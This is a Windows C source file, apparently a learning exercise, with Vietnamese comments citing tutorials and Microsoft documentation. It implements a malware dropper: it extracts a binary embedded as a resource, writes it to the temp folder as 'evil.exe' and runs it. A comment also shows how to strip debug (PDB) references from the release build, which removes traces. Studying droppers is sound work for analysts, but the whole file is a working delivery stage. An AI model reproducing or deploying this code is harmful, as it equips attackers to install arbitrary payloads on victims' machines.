#include "resource.h"
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

/*
** Ref:
** 1. Lập Trình Win32 API - Phần 3: Tạo Và Sử Dụng Resource
**    https://www.stdio.vn/modern-cpp/lap-trinh-win-32-api-phan-3-tao-va-su-dung-resource-Y1F6nH
** 2. Tạo Resource để nhúng một tệp tin vào resource section của chương trình C/C++
**		B1: Solution Explorer > Resource view > Project name > Add > Resource > Import > Chọn tệp cần import (Đặt type là BIN) > Sau khi import sẽ tự sinh ra file: *.h, *.rc và tệp vừa import
**		B2: Buid thử chương trình trống nhưng đã có resource.
**		B3: Lấy ID của Resource: Solution Explorer > Resource view > Project name > Chọn Resource > Xem Properties > ID
**		B4: Thêm: #include "resource.h" vào Main Program source.
** 3. MSDN - Creating and Using a Temporary File
**    https://docs.microsoft.com/en-us/windows/win32/fileio/creating-and-using-a-temporary-file
** 4. MSDN - Using Resources
**    https://docs.microsoft.com/en-us/windows/win32/menurc/using-resources
** 5. Remove PDB references from released file
**    https://stackoverflow.com/a/11109378
** => Project Properties > Linker > Debugging > Generate Debug Info and set it to No.
*/

int main()
{
	// *** Stage 1: Find and load resource ***
	HRSRC	hRes;			 // handle/ptr resource
	HGLOBAL	hResLoad;		 // handle to loaded resource
	LPVOID	lpResLock;		 // pointer to resource data

	// Locate the resource in file.
	printf(" [+] Finding resource.\n");
	Sleep(500);

	hRes = FindResourceA(
		NULL,		// locate resource current process
		102,		// name of resource (resource ID)
		"BIN");		// type of resource
	if (hRes == NULL) {
		printf(" [-] Could not locate resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Load the resource into global memory.
	hResLoad = LoadResource(
		NULL,	// current process
		hRes);	// handle to the resource
	if (hResLoad == NULL) {
		printf(" [-] Could not load resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Lock the resource into global memory.
	lpResLock = LockResource(hResLoad);
	if (lpResLock == NULL) {
		printf(" [-] Could not lock resource. Error Code = %d\n", GetLastError());
		return;
	}


	// *** Stage 2: Dropped/Extract/Write resource binary to file ***
	DWORD	dwSizeOfRes = 0;			// size (bytes) of the specified resource
	TCHAR	filePath[MAX_PATH];			// full path of file dropped
	TCHAR	lpTempPathBuffer[MAX_PATH];	// path of temp directory
	DWORD	dwRetVal = 0;				// temp variable

	printf(" [+] Dropping evil file.\n");
	Sleep(500);

	// Calculating size of resource
	dwSizeOfRes = SizeofResource(
		NULL,	// current process
		hRes);	// handle/ptr resource

	// Get the temp path env
	dwRetVal = GetTempPath(
		MAX_PATH,          // length of the buffer
		lpTempPathBuffer); // buffer for path 
	if (dwRetVal > MAX_PATH || (dwRetVal == 0)) {
		printf(" [-] Could not get temp path. Error Code = %d\n", GetLastError());
		return;
	}

	// Generates a temporary file name.
	wsprintfA(filePath, TEXT("%sevil.exe"), lpTempPathBuffer);

	HANDLE	hFileWriter;
	DWORD	dwBytesWritten = 0;
	BOOL	bErrorFlag = FALSE;

	// Create dropped file
	hFileWriter = CreateFile(
		filePath,				// name of the write
		GENERIC_WRITE,			// open for writing
		NULL,					// do not share
		NULL,					// default security
		CREATE_NEW,				// create new file only
		FILE_ATTRIBUTE_NORMAL,	// normal file
		NULL);					// no attr. template
	if (hFileWriter == INVALID_HANDLE_VALUE) {
		printf(" [-] Terminal failure: Unable to open file \"%s\" for write. Error Code = %d\n", filePath, GetLastError());
		return;
	}

	printf(" [+] Writing %d bytes to \"%s\".\n", dwSizeOfRes, filePath);
	Sleep(500);

	bErrorFlag = WriteFile(
		hFileWriter,		// open file handle
		lpResLock,			// start of data to write
		dwSizeOfRes,		// number of bytes to write
		&dwBytesWritten,	// number of bytes that were written
		NULL);				// no overlapped structure
	if (FALSE == bErrorFlag) {
		printf(" [-] Terminal failure: Unable to write to \"%s\". Error Code = %d\n", filePath, GetLastError());
	}
	else {
		if (dwBytesWritten != dwSizeOfRes) {
			printf(" [-] Error: dwBytesWritten != dwSizeOfRes. Error Code = %d\n", GetLastError());
		}
		else {
			printf(" [+] Wrote %d bytes to \"%s\" successfully.\n", dwBytesWritten, filePath);
		}
	}
	CloseHandle(hFileWriter);

	// *** Stage 3: Execute dropped binary ***
	printf(" [+] Running evil executable.\n");
	Sleep(500);
	ShellExecuteA(NULL, "open", filePath, NULL, NULL, 1);
	printf(" [+] Successfully. Goodbye!\n");

	return 0;
}